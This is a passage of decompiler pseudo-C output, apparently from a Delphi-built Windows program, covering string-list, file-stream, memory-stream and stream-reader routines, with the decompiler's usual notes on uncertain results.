      if ( v7 >= 0 )
      {
        v5 = v6 - 1;
        if ( !v7 )
        {
          v11 = 1;
          if ( *(_BYTE *)(a1 + 25) != 1 )
            v4 = v6;
        }
      }
      else
      {
        v4 = v6 + 1;
      }
    }
    while ( v5 >= v4 );
  }
  *a3 = v4;
  return v11;
}

//----- (0040D500) --------------------------------------------------------
volatile __int32 *__usercall sub_40D500@<eax>(int a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>)
{
  if ( a2 < 0 || a2 >= *(_DWORD *)(a1 + 16) )
    sub_40CA44(a1, off_41DC24[0], a2);
  return sub_40351C(a3, *(_DWORD *)(*(_DWORD *)(a1 + 12) + 8 * a2));
}
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040D534) --------------------------------------------------------
int __usercall sub_40D534@<eax>(int a1@<eax>)
{
  return *(_DWORD *)(a1 + 20);
}

//----- (0040D538) --------------------------------------------------------
int __usercall sub_40D538@<eax>(int a1@<eax>)
{
  return *(_DWORD *)(a1 + 16);
}

//----- (0040D53C) --------------------------------------------------------
int __usercall sub_40D53C@<eax>(int a1@<eax>, int a2@<edx>)
{
  if ( a2 < 0 || a2 >= *(_DWORD *)(a1 + 16) )
    sub_40CA44(a1, off_41DC24[0], a2);
  return *(_DWORD *)(*(_DWORD *)(a1 + 12) + 8 * a2 + 4);
}
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040D564) --------------------------------------------------------
int __usercall sub_40D564@<eax>(int a1@<eax>)
{
  return (*(int (**)(void))(*(_DWORD *)a1 + 40))();
}
// 40D571: conditional instruction was optimized away because edx.4>=41

//----- (0040D598) --------------------------------------------------------
int __usercall sub_40D598@<eax>(_BYTE *a1@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  int v4[3]; // [esp+0h] [ebp-Ch] BYREF

  v4[0] = a3;
  if ( !a1[24] )
    return sub_40CCCC((int)a1, a2);
  if ( !(*(unsigned __int8 (__fastcall **)(int *, char *))(*(_DWORD *)a1 + 120))(v4, a2) )
    v4[0] = -1;
  return v4[0];
}
// 40D598: using guessed type int var_C[3];

//----- (0040D5D0) --------------------------------------------------------
int __usercall sub_40D5D0@<eax>(int a1@<eax>, int a2@<edx>, __int32 a3@<ecx>)
{
  if ( *(_BYTE *)(a1 + 24) )
    sub_40CA44(a1, off_41DB90[0], 0);
  if ( a2 < 0 || a2 > *(_DWORD *)(a1 + 16) )
    sub_40CA44(a1, off_41DC24[0], a2);
  return sub_40D618((_DWORD *)a1, a2, a3);
}
// 41DB90: using guessed type int **off_41DB90[24];
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040D618) --------------------------------------------------------
int __usercall sub_40D618@<eax>(_DWORD *a1@<eax>, int a2@<edx>, __int32 a3@<ecx>)
{
  int v6; // eax
  int v7; // esi

  (*(void (**)(void))(*a1 + 116))();
  if ( a1[4] == a1[5] )
    sub_40D564((int)a1);
  v6 = a1[4];
  if ( a2 < v6 )
    sub_4026B0((char *)(a1[3] + 8 * a2), (char *)(a1[3] + 8 * a2 + 8), 8 * (v6 - a2));
  v7 = a1[3] + 8 * a2;
  *(_DWORD *)v7 = 0;
  *(_DWORD *)(v7 + 4) = 0;
  sub_40351C((volatile __int32 *)v7, a3);
  ++a1[4];
  return (*(int (**)(void))(*a1 + 112))();
}

//----- (0040D680) --------------------------------------------------------
int __usercall sub_40D680@<eax>(int a1@<eax>, int a2@<edx>, __int32 a3@<ecx>)
{
  if ( *(_BYTE *)(a1 + 24) )
    sub_40CA44(a1, off_41DB90[0], 0);
  if ( a2 < 0 || a2 >= *(_DWORD *)(a1 + 16) )
    sub_40CA44(a1, off_41DC24[0], a2);
  (*(void (**)(void))(*(_DWORD *)a1 + 116))();
  sub_40351C((volatile __int32 *)(*(_DWORD *)(a1 + 12) + 8 * a2), a3);
  return (*(int (**)(void))(*(_DWORD *)a1 + 112))();
}
// 41DB90: using guessed type int **off_41DB90[24];
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040D6D8) --------------------------------------------------------
int __usercall sub_40D6D8@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  if ( a2 < 0 || a2 >= a1[4] )
    sub_40CA44((int)a1, off_41DC24[0], a2);
  (*(void (**)(void))(*a1 + 116))();
  *(_DWORD *)(a1[3] + 8 * a2 + 4) = a3;
  return (*(int (**)(void))(*a1 + 112))();
}
// 41DC24: using guessed type int **off_41DC24[3];

//----- (0040D714) --------------------------------------------------------
int *__userpurge sub_40D714@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int (__fastcall *a4)(unsigned int, int))
{
  int v4; // ebx
  int v5; // esi
  int i; // eax
  int *result; // eax
  unsigned int v8; // [esp+8h] [ebp-10h]

  do
  {
    v4 = a2;
    v5 = a3;
    v8 = (unsigned int)(a3 + a2) >> 1;
    for ( i = a4(v8, a2); ; i = a4(v8, v4) )
    {
      if ( i < 0 )
      {
        ++v4;
        continue;
      }
      while ( 1 )
      {
        result = (int *)a4(v8, v5);
        if ( (int)result <= 0 )
          break;
        --v5;
      }
      if ( v5 >= v4 )
      {
        result = sub_40D474(a1, v4, v5);
        if ( v4 == v8 )
        {
          v8 = v5;
        }
        else if ( v5 == v8 )
        {
          v8 = v4;
        }
        ++v4;
        --v5;
      }
      if ( v5 < v4 )
        break;
    }
    if ( v5 > a2 )
      result = sub_40D714(a1, a2, v5, a4);
    a2 = v4;
  }
  while ( v4 < a3 );
  return result;
}

//----- (0040D7A8) --------------------------------------------------------
_DWORD *__usercall sub_40D7A8@<eax>(int a1@<eax>, int a2@<edx>)
{
  _DWORD *result; // eax

  result = sub_4025C8((_DWORD *)(a1 + 12), 8 * a2);
  *(_DWORD *)(a1 + 20) = a2;
  return result;
}

//----- (0040D7C4) --------------------------------------------------------
int __usercall sub_40D7C4@<eax>(int a1@<eax>, char a2@<dl>)
{
  if ( a2 )
    return (*(int (**)(void))(*(_DWORD *)a1 + 116))();
  else
    return (*(int (**)(void))(*(_DWORD *)a1 + 112))();
}

//----- (0040D7D4) --------------------------------------------------------
int __usercall sub_40D7D4@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  return sub_406E64(*(char **)(*(_DWORD *)(a1 + 12) + 8 * a2), *(char **)(*(_DWORD *)(a1 + 12) + 8 * a3));
}

//----- (0040D7EC) --------------------------------------------------------
int __usercall sub_40D7EC@<eax>(int a1@<eax>)
{
  return (*(int (**)(void))(*(_DWORD *)a1 + 128))();
}

//----- (0040D7FC) --------------------------------------------------------
int __usercall sub_40D7FC@<eax>(int result@<eax>, int (__fastcall *a2)(unsigned int, int)@<edx>)
{
  _DWORD *v3; // ebx

  v3 = (_DWORD *)result;
  if ( !*(_BYTE *)(result + 24) && *(int *)(result + 16) > 1 )
  {
    (*(void (**)(void))(*(_DWORD *)result + 116))();
    sub_40D714((int)v3, 0, v3[4] - 1, a2);
    return (*(int (**)(void))(*v3 + 112))();
  }
  return result;
}

//----- (0040D830) --------------------------------------------------------
int __usercall sub_40D830@<eax>(int a1@<eax>)
{
  return (*(int (__fastcall **)(__int16, _DWORD))(*(_DWORD *)a1 + 12))(1, 0);
}

//----- (0040D840) --------------------------------------------------------
int __usercall sub_40D840@<eax>(int a1@<eax>)
{
  return (*(int (__thiscall **)(_DWORD))(*(_DWORD *)a1 + 12))(0);
}

//----- (0040D84C) --------------------------------------------------------
int __usercall sub_40D84C@<eax>(int a1@<eax>)
{
  int v2; // esi
  int v3; // ecx
  int v4; // edi

  v2 = (*(int (__fastcall **)(__int16, _DWORD))(*(_DWORD *)a1 + 12))(1, 0);
  LOWORD(v3) = 2;
  v4 = (*(int (__fastcall **)(int, _DWORD))(*(_DWORD *)a1 + 12))(v3, 0);
  (*(void (__fastcall **)(_DWORD, int))(*(_DWORD *)a1 + 12))(0, v2);
  return v4;
}
// 40D86A: variable 'v3' is possibly undefined

//----- (0040D884) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_40D884(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  DWORD v3; // [esp-10h] [ebp-1Ch]
  DWORD v4; // [esp-Ch] [ebp-18h]
  DWORD v5; // [esp-8h] [ebp-14h]
  const ULONG_PTR *v6; // [esp-4h] [ebp-10h]

  if ( a3 )
  {
    if ( a3 != (*(int (__fastcall **)(int, int))(*(_DWORD *)a1 + 4))(a3, a2) )
    {
      sub_40950C((int)dword_40B6E4, 1, off_41DC54[0]);
      sub_402F98(v3, v4, v5, v6);
    }
  }
}
// 40D8BA: positive sp value 10 has been found
// 40D8B2: variable 'v3' is possibly undefined
// 40D8B2: variable 'v4' is possibly undefined
// 40D8B2: variable 'v5' is possibly undefined
// 40D8B2: variable 'v6' is possibly undefined
// 40B6E4: using guessed type int dword_40B6E4[3];
// 41DC54: using guessed type int **off_41DC54[12];

//----- (0040D8BC) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_40D8BC(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  DWORD v3; // [esp-10h] [ebp-1Ch]
  DWORD v4; // [esp-Ch] [ebp-18h]
  DWORD v5; // [esp-8h] [ebp-14h]
  const ULONG_PTR *v6; // [esp-4h] [ebp-10h]

  if ( a3 )
  {
    if ( a3 != (*(int (__fastcall **)(int, int))(*(_DWORD *)a1 + 8))(a3, a2) )
    {
      sub_40950C((int)dword_40B73C, 1, off_41DBB4[0]);
      sub_402F98(v3, v4, v5, v6);
    }
  }
}
// 40D8F2: positive sp value 10 has been found
// 40D8EA: variable 'v3' is possibly undefined
// 40D8EA: variable 'v4' is possibly undefined
// 40D8EA: variable 'v5' is possibly undefined
// 40D8EA: variable 'v6' is possibly undefined
// 40B73C: using guessed type int dword_40B73C[3];
// 41DBB4: using guessed type int **off_41DBB4[15];

//----- (0040D8F4) --------------------------------------------------------
DWORD __usercall sub_40D8F4@<eax>(int a1@<eax>, void *a2@<edx>, DWORD a3@<ecx>)
{
  DWORD result; // eax

  result = sub_4070D4(a3, a2, *(void **)(a1 + 4));
  if ( result == -1 )
    return 0;
  return result;
}

//----- (0040D904) --------------------------------------------------------
DWORD __usercall sub_40D904@<eax>(int a1@<eax>, const void *a2@<edx>, DWORD a3@<ecx>)
{
  DWORD result; // eax

  result = sub_407100(a3, a2, *(void **)(a1 + 4));
  if ( result == -1 )
    return 0;
  return result;
}

//----- (0040D914) --------------------------------------------------------
DWORD __usercall sub_40D914@<eax>(int a1@<eax>, LONG a2@<edx>, unsigned __int16 a3@<cx>)
{
  return sub_40712C(a3, a2, *(void **)(a1 + 4));
}

//----- (0040D920) --------------------------------------------------------
int __usercall sub_40D920@<eax>(HANDLE *a1@<eax>)
{
  int v2; // eax

  (*((void (__thiscall **)(_DWORD))*a1 + 3))(0);
  v2 = SetEndOfFile_0(a1[1]);
  return sub_40A430(v2);
}

//----- (0040D940) --------------------------------------------------------
_DWORD *__userpurge sub_40D940@<eax>(_DWORD *a1@<eax>, char a2@<dl>, char *a3@<ecx>, __int16 a4)
{
  char *v4; // esi
  _DWORD *v5; // ebx
  HANDLE v6; // eax
  DWORD v8; // [esp-10h] [ebp-28h]
  DWORD v9; // [esp-Ch] [ebp-24h]
  DWORD v10; // [esp-8h] [ebp-20h]
  const ULONG_PTR *v11; // [esp-4h] [ebp-1Ch]
  char *v12; // [esp+Ch] [ebp-Ch] BYREF
  char v13; // [esp+10h] [ebp-8h]
  char v14; // [esp+17h] [ebp-1h]

  if ( a2 )
    a1 = (_DWORD *)sub_402CDC((int)a1, a2);
  v4 = a3;
  v14 = a2;
  v5 = a1;
  if ( a4 == -1 )
  {
    v6 = sub_4070B0(a3);
    v5[1] = v6;
    if ( (int)v6 < 0 )
    {
      v12 = v4;
      v13 = 11;
      sub_409548((int)dword_40B5D8, 1, off_41DC2C, 0, (int)&v12);
      sub_402F98(v8, v9, v10, v11);
    }
  }
  else
  {
    a1[1] = sub_407070(a3, a4);
    if ( (int)v5[1] < 0 )
    {
      v12 = v4;
      v13 = 11;
      sub_409548((int)dword_40B634, 1, off_41DC38[0], 0, (int)&v12);
      sub_402F98(v8, v9, v10, v11);
    }
  }
  if ( v14 )
    sub_402D34(v5);
  return v5;
}
// 40D955: variable 'a3' is possibly undefined
// 40D957: variable 'a2' is possibly undefined
// 40D995: variable 'v8' is possibly undefined
// 40D995: variable 'v9' is possibly undefined
// 40D995: variable 'v10' is possibly undefined
// 40D995: variable 'v11' is possibly undefined
// 40B5D8: using guessed type int dword_40B5D8[4];
// 40B634: using guessed type int dword_40B634[3];
// 41DC2C: using guessed type int **off_41DC2C;
// 41DC38: using guessed type int **off_41DC38[19];

//----- (0040D9F8) --------------------------------------------------------
void *__usercall sub_40D9F8@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  void *result; // eax

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  result = (void *)v2[1];
  if ( (int)result >= 0 )
    result = (void *)sub_407138(result);
  if ( v4 > 0 )
    return (void *)sub_402D2C(v5);
  return result;
}
// 40D9FF: variable 'v3' is possibly undefined

//----- (0040DA20) --------------------------------------------------------
int __usercall sub_40DA20@<eax>(int result@<eax>, int a2@<edx>, int a3@<ecx>)
{
  *(_DWORD *)(result + 4) = a2;
  *(_DWORD *)(result + 8) = a3;
  return result;
}

//----- (0040DA28) --------------------------------------------------------
int __usercall sub_40DA28@<eax>(_DWORD *a1@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  int v4; // edi
  int v5; // esi

  v4 = a1[3];
  if ( v4 < 0 )
    return 0;
  if ( a3 < 0 )
    return 0;
  v5 = a1[2] - v4;
  if ( v5 <= 0 )
    return 0;
  if ( a3 < v5 )
    v5 = a3;
  sub_4026B0((char *)(v4 + a1[1]), a2, v5);
  a1[3] += v5;
  return v5;
}

//----- (0040DA60) --------------------------------------------------------
int __usercall sub_40DA60@<eax>(int a1@<eax>, int a2@<edx>, __int16 a3@<cx>)
{
  bool v3; // cf
  __int16 v4; // cx

  v3 = a3 == 0;
  v4 = a3 - 1;
  if ( v3 )
  {
    *(_DWORD *)(a1 + 12) = a2;
  }
  else if ( v4 )
  {
    if ( v4 == 1 )
      *(_DWORD *)(a1 + 12) = *(_DWORD *)(a1 + 8) + a2;
  }
  else
  {
    *(_DWORD *)(a1 + 12) += a2;
  }
  return *(_DWORD *)(a1 + 12);
}

//----- (0040DA84) --------------------------------------------------------
_DWORD *__usercall sub_40DA84@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  int *v2; // eax
  char v3; // dl
  char v4; // bl
  int *v5; // esi
  _DWORD *result; // eax

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_40DAB0(v2);
  result = sub_402BCC(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_402D2C(v5);
  return result;
}
// 40DA8B: variable 'v3' is possibly undefined

//----- (0040DAB0) --------------------------------------------------------
int __usercall sub_40DAB0@<eax>(int *a1@<eax>)
{
  int result; // eax

  sub_40DB54(a1);
  a1[2] = 0;
  result = 0;
  a1[3] = 0;
  return result;
}

//----- (0040DAC8) --------------------------------------------------------
void __usercall sub_40DAC8(int a1@<eax>, int a2@<edx>)
{
  int v4; // ebx

  sub_40D840(a2);
  v4 = sub_40D84C(a2);
  (**(void (***)(void))a1)();
  if ( v4 )
    sub_40D884(a2, *(_DWORD *)(a1 + 4), v4);
}

//----- (0040DB00) --------------------------------------------------------
_DWORD *__usercall sub_40DB00@<eax>(int a1@<eax>, char *a2@<edx>)
{
  unsigned int v4[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v5; // [esp-4h] [ebp-Ch]
  _DWORD *v6; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v6 = sub_40D940(off_40BD88, 1, a2, 32);
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_40DB48;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_40DAC8(a1, (int)v6);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_40DB4F;
  return sub_402BDC(v6);
}
// 40BD88: using guessed type int (*off_40BD88[4])();

//----- (0040DB54) --------------------------------------------------------
int __usercall sub_40DB54@<eax>(int *a1@<eax>)
{
  int v2; // eax
  int result; // eax
  int v4; // [esp+0h] [ebp-8h]

  v2 = (*(int (**)(void))(*a1 + 16))();
  sub_40DA20((int)a1, v2, a1[2]);
  result = v4;
  a1[4] = v4;
  return result;
}

//----- (0040DB7C) --------------------------------------------------------
int __usercall sub_40DB7C@<eax>(int *a1@<eax>, int a2@<edx>)
{
  int v4; // edi
  int result; // eax
  int v6; // ecx

  v4 = a1[3];
  result = sub_40DB54(a1);
  a1[2] = a2;
  if ( a2 < v4 )
  {
    LOWORD(v6) = 2;
    return (*(int (__fastcall **)(int, _DWORD))(*a1 + 12))(v6, 0);
  }
  return result;
}
// 40DBA0: variable 'v6' is possibly undefined

//----- (0040DBA8) --------------------------------------------------------
#error "40DC1F: call analysis failed (funcsize=47)"

//----- (0040DC2C) --------------------------------------------------------
int __usercall sub_40DC2C@<eax>(int *a1@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  int v6; // eax
  int v7; // edi

  v6 = a1[3];
  if ( v6 < 0 )
    return 0;
  if ( a3 < 0 )
    return 0;
  v7 = a3 + v6;
  if ( a3 + v6 <= 0 )
    return 0;
  if ( v7 > a1[2] )
  {
    if ( v7 > a1[4] )
      sub_40DB54(a1);
    a1[2] = v7;
  }
  sub_4026B0(a2, (char *)(a1[3] + a1[1]), a3);
  a1[3] = v7;
  return a3;
}

//----- (0040DC7C) --------------------------------------------------------
void __usercall sub_40DC7C(int a1@<eax>, _BYTE *a2@<edx>)
{
  _DWORD *v2; // edi
  int v3; // ebx
  int v4; // eax
  _DWORD *v5; // esi
  unsigned int v6[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v7; // [esp-4h] [ebp-18h]
  _BYTE *v8; // [esp+Ch] [ebp-8h]
  int v9; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v8 = a2;
  v9 = a1;
  if ( dword_41E624 )
  {
    v2 = (_DWORD *)sub_40C4B0(dword_41E624);
    v7 = &savedregs;
    v6[1] = (unsigned int)&loc_40DD17;
    v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v6);
    v3 = v2[2] - 1;
    if ( v3 >= 0 )
    {
      do
      {
        v4 = sub_40C20C((int)v2, v3);
        v5 = (_DWORD *)v4;
        if ( (!v9 || *(_DWORD *)(v4 + 8) == v9) && (!v8 || sub_406E40(v8, *(_BYTE **)(v4 + 16))) )
        {
          sub_40C11C(v2, v3);
          sub_402BDC(v5);
        }
        --v3;
      }
      while ( v3 != -1 );
    }
    __writefsdword(0, v6[0]);
    v7 = (int *)&loc_40DD1E;
    sub_40C514(dword_41E624);
  }
}
// 41E624: using guessed type int dword_41E624;

//----- (0040DD28) --------------------------------------------------------
void __usercall sub_40DD28(int a1@<eax>)
{
  _DWORD *v1; // edi
  int v2; // ebx
  _DWORD *v3; // esi
  unsigned int v4[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v5; // [esp-4h] [ebp-14h]
  int v6; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v6 = a1;
  if ( dword_41E624 )
  {
    v1 = (_DWORD *)sub_40C4B0(dword_41E624);
    v5 = &savedregs;
    v4[1] = (unsigned int)&loc_40DD9F;
    v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v4);
    v2 = v1[2] - 1;
    if ( v2 >= 0 )
    {
      do
      {
        v3 = (_DWORD *)sub_40C20C((int)v1, v2);
        if ( v3[1] == v6 )
        {
          sub_40C11C(v1, v2);
          sub_402BDC(v3);
        }
        --v2;
      }
      while ( v2 != -1 );
    }
    __writefsdword(0, v4[0]);
    v5 = (int *)&loc_40DDA6;
    sub_40C514(dword_41E624);
  }
}
// 41E624: using guessed type int dword_41E624;

//----- (0040DDAC) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __usercall sub_40DDAC(int **a1@<eax>)
{
  DWORD v1; // [esp-10h] [ebp-14h]
  DWORD v2; // [esp-Ch] [ebp-10h]
  DWORD v3; // [esp-8h] [ebp-Ch]
  const ULONG_PTR *v4; // [esp-4h] [ebp-8h]

  sub_40950C((int)dword_40B6E4, 1, a1);
  sub_402F98(v1, v2, v3, v4);
}
// 40DDC3: positive sp value 10 has been found
// 40DDBD: variable 'v1' is possibly undefined
// 40DDBD: variable 'v2' is possibly undefined
// 40DDBD: variable 'v3' is possibly undefined
// 40DDBD: variable 'v4' is possibly undefined
// 40B6E4: using guessed type int dword_40B6E4[3];

//----- (0040DDC4) --------------------------------------------------------
void sub_40DDC4()
{
  sub_40DDAC(off_41DBE8[0]);
}
// 41DBE8: using guessed type int **off_41DBE8[2];

//----- (0040DDD0) --------------------------------------------------------
void __usercall sub_40DDD0(_DWORD *a1@<eax>, char a2@<dl>, int a3@<ecx>)
{
  int v4; // ecx

  if ( a2 != (unsigned __int8)sub_40DF4C(a1, a3) )
  {
    --a1[4];
    sub_40E0AC(a1, v4);
    sub_40DDC4();
  }
}
// 40DDE6: variable 'v4' is possibly undefined

//----- (0040DDF4) --------------------------------------------------------
bool __usercall sub_40DDF4@<al>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  bool result; // al

  result = (unsigned __int8)sub_40DF4C(a1, a2) == 0;
  --a1[4];
  return result;
}

//----- (0040DE08) --------------------------------------------------------
__int64 __usercall sub_40DE08@<edx:eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  __int64 result; // rax

  result = sub_40DF4C(a1, a2);
  --a1[4];
  return result;
}

//----- (0040DE18) --------------------------------------------------------
_DWORD *__usercall sub_40DE18@<eax>(_DWORD *result@<eax>, char *a2@<edx>, unsigned int a3@<ecx>)
{
  _DWORD *v5; // esi
  unsigned int v6; // ecx
  bool v7; // cc
  unsigned int v8; // ecx
  char v9; // dl
  unsigned int v10; // ecx
  char *v11; // edi
  _DWORD *v12; // esi
  int v13; // ecx
  _DWORD *v14; // [esp-4h] [ebp-10h]

  v5 = result;
  while ( a3 )
  {
    v6 = v5[5];
    v7 = v6 <= v5[4];
    v8 = v6 - v5[4];
    if ( v7 )
    {
      sub_40DE64((int)v5);
      v8 = v5[5];
    }
    if ( v8 >= a3 )
      v8 = a3;
    v14 = v5;
    a3 -= v8;
    result = (_DWORD *)(v5[4] + v5[2]);
    v5[4] += v8;
    v9 = v8;
    v10 = v8 >> 2;
    qmemcpy(a2, result, 4 * v10);
    v12 = &result[v10];
    v11 = &a2[4 * v10];
    v13 = v9 & 3;
    qmemcpy(v11, v12, v13);
    a2 = &v11[v13];
    v5 = v14;
  }
  return result;
}

//----- (0040DE64) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int __usercall sub_40DE64@<eax>(int a1@<eax>)
{
  int v2; // eax
  int result; // eax
  DWORD v4; // [esp-10h] [ebp-18h]
  DWORD v5; // [esp-Ch] [ebp-14h]
  DWORD v6; // [esp-8h] [ebp-10h]
  const ULONG_PTR *v7; // [esp-4h] [ebp-Ch]

  v2 = (*(int (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(a1 + 4) + 4))(*(_DWORD *)(a1 + 12), *(_DWORD *)(a1 + 8));
  *(_DWORD *)(a1 + 20) = v2;
  if ( !v2 )
  {
    sub_40950C((int)dword_40B6E4, 1, off_41DC54[0]);
    sub_402F98(v4, v5, v6, v7);
  }
  result = 0;
  *(_DWORD *)(a1 + 16) = 0;
  return result;
}
// 40DE9D: positive sp value 10 has been found
// 40DE91: variable 'v4' is possibly undefined
// 40DE91: variable 'v5' is possibly undefined
// 40DE91: variable 'v6' is possibly undefined
// 40DE91: variable 'v7' is possibly undefined
// 40B6E4: using guessed type int dword_40B6E4[3];
// 41DC54: using guessed type int **off_41DC54[12];

//----- (0040DEA0) --------------------------------------------------------
void __usercall sub_40DEA0(_DWORD *a1@<eax>, int a2@<ecx>)
{
  sub_40DDD0(a1, 1, a2);
}

//----- (0040DEA8) --------------------------------------------------------
void __usercall sub_40DEA8(void *this@<ecx>, _DWORD *a2@<eax>)
{
  sub_40DDD0(a2, 0, (int)this);
}

//----- (0040DEB0) --------------------------------------------------------
_DWORD *__usercall sub_40DEB0@<eax>(_DWORD *a1@<eax>, char **a2@<edx>, int a3@<ecx>)
{
  char *v5; // eax
  int v7[3]; // [esp+0h] [ebp-Ch] BYREF

  v7[0] = a3;
  sub_40DE18(a1, (char *)v7, 1u);
  sub_4035B0(a2, 0, LOBYTE(v7[0]));
  v5 = sub_4038F4(a2);
  return sub_40DE18(a1, v5, LOBYTE(v7[0]));
}
// 40DEB0: using guessed type int var_C[3];

//----- (0040DEEC) --------------------------------------------------------
_DWORD *__usercall sub_40DEEC@<eax>(_DWORD *a1@<eax>, char **a2@<edx>, int a3@<ecx>)
{
  char v5; // al
  int v7[3]; // [esp+0h] [ebp-Ch] BYREF

  v7[0] = 0;
  v5 = sub_40DF4C(a1, a3) - 6;
  if ( v5 )
  {
    if ( v5 == 6 )
      sub_40DE18(a1, (char *)v7, 4u);
    else
      sub_40DDC4();
  }
  else
  {
    sub_40DE18(a1, (char *)v7, 1u);
  }
  sub_4035B0(a2, 0, v7[0]);
  return sub_40DE18(a1, *a2, v7[0]);
}

//----- (0040DF4C) --------------------------------------------------------
__int64 __usercall sub_40DF4C@<edx:eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  __int64 result; // rax
  int v3; // [esp+0h] [ebp-4h] BYREF

  v3 = a2;
  LODWORD(result) = sub_40DE18(a1, (char *)&v3, 1u);
  LOBYTE(result) = v3;
  HIDWORD(result) = v3;
  return result;
}

//----- (0040DF60) --------------------------------------------------------
_DWORD *__usercall sub_40DF60@<eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  unsigned int v4[2]; // [esp-10h] [ebp-14h] BYREF
  int *v5; // [esp-8h] [ebp-Ch]
  char *v6; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v6 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_40DF9C;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  do
    sub_40DEB0(a1, &v6, a2);
  while ( v6 );
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_40DFA3;
  return sub_4034C8(&v6);
}
// 40DF7B: variable 'a2' is possibly undefined

//----- (0040DFA8) --------------------------------------------------------
void __cdecl sub_40DFA8(int a1)
{
  int v1; // ecx
  _DWORD **i; // ebx
  void *v3; // ecx

  for ( i = (_DWORD **)(a1 - 4); !sub_40DDF4(*i, v1); sub_40E0AC(*i, (int)v3) )
    ;
  sub_40DEA8(v3, *i);
}
// 40DFB6: variable 'v3' is possibly undefined
// 40DFBD: variable 'v1' is possibly undefined

//----- (0040DFD0) --------------------------------------------------------
_DWORD *__usercall sub_40DFD0@<eax>(_DWORD *result@<eax>, int a2)
{
  signed int v2; // ebx
  char v3[256]; // [esp+4h] [ebp-100h] BYREF

  v2 = (signed int)result;
  while ( v2 > 0 )
  {
    if ( v2 <= 256 )
    {
      result = sub_40DE18(*(_DWORD **)(a2 - 4), v3, v2);
      v2 = 0;
    }
    else
    {
      result = sub_40DE18(*(_DWORD **)(a2 - 4), v3, 0x100u);
      v2 -= 256;
    }
  }
  return result;
}

//----- (0040E024) --------------------------------------------------------
_DWORD *__cdecl sub_40E024(int a1)
{
  _DWORD *v1; // ecx
  _DWORD *v3; // [esp+0h] [ebp-4h] BYREF

  v3 = v1;
  sub_40DE18(*(_DWORD **)(a1 - 4), (char *)&v3, 4u);
  return sub_40DFD0(v3, a1);
}
// 40E027: variable 'v1' is possibly undefined

//----- (0040E04C) --------------------------------------------------------
void __cdecl sub_40E04C(int a1)
{
  int v1; // ecx
  _DWORD **i; // ebx
  int v3; // ecx
  int v4; // ecx
  void *v5; // ecx
  void *v6; // ecx
  int v7; // [esp-4h] [ebp-8h]

  for ( i = (_DWORD **)(a1 - 4); !sub_40DDF4(*i, v1); sub_40DEA8(v5, *i) )
  {
    if ( (unsigned __int8)(sub_40DE08(*i, (int)v6) - 2) < 3u )
      sub_40E0AC(*i, v3);
    sub_40DFD0((_DWORD *)1, a1);
    v4 = v7;
    while ( !sub_40DDF4(*i, v4) )
      sub_40E214(*i, (int)v5);
  }
  sub_40DEA8(v6, *i);
}
// 40E05A: variable 'v6' is possibly undefined
// 40E067: variable 'v3' is possibly undefined
// 40E07A: variable 'v7' is possibly undefined
// 40E07F: variable 'v5' is possibly undefined
// 40E086: variable 'v4' is possibly undefined
// 40E098: variable 'v1' is possibly undefined

//----- (0040E0AC) --------------------------------------------------------
_DWORD *__usercall sub_40E0AC@<eax>(_DWORD *a1@<eax>, int a2@<ecx>)
{
  int v2; // ecx
  unsigned int v4[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v5; // [esp-4h] [ebp-Ch]
  char *v6; // [esp+0h] [ebp-8h] BYREF
  _DWORD *v7; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v6 = 0;
  v7 = a1;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_40E209;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  switch ( sub_40DF4C(a1, a2) & 0x7F )
  {
